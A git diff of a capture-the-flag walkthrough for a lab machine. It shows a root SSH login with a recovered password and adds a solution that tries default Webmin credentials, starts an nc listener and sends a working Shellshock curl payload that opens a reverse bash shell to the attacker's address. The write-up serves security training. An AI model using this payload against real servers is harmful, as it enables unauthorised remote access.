@@ -151,7 +151,7 @@ view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../
 
 + Now there are enumerated users and passwords.
 
-+ Login ssh using `root`:`jEhdIekWmdjE`:
++ Login ssh using `root`:`jEhdIekWmdjE`
 + `ssh root@10.10.10.7`
 + If meet an error, check [1](https://www.iclarified.com/85252/how-to-fix-no-matching-key-exchange-method-found-on-mac) [2](https://askubuntu.com/questions/836048/ssh-returns-no-matching-host-key-type-found-their-offer-ssh-dss)
 + Login `ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-rsa root@10.10.10.7`
@@ -159,6 +159,19 @@ view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4cf306f2-3f06-4311-ba44-3fba99817893)
 
 ### 2.Solution:
++ Navigate to `https://10.10.10.7:10000/` and try login: `admin`:`admin`
++ Failed attempt redirects `https://10.10.10.7:10000/session_login.cgi`
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6fa5ccff-6d76-417c-a1ed-aaa81fd351cd)
+
++ Check [Shellshock vulnerability](https://github.com/opsxcq/exploit-CVE-2014-6271): [CVE-2014-6271](https://github.com/b4keSn4ke/CVE-2014-6271)
++ Start listener: `nc -lnvp 5555`
++ Trigger the below curl payload request:
+```
+curl -A "() { :; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -i >& /dev/tcp/10.10.14.18/5555 0>&1" https://10.10.10.7:10000/session_login.cgi -k
+```
+
++ Get root shell:
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/27ac05b7-ad64-4ee1-9af6-012dc4b8b77a)
 
 
 
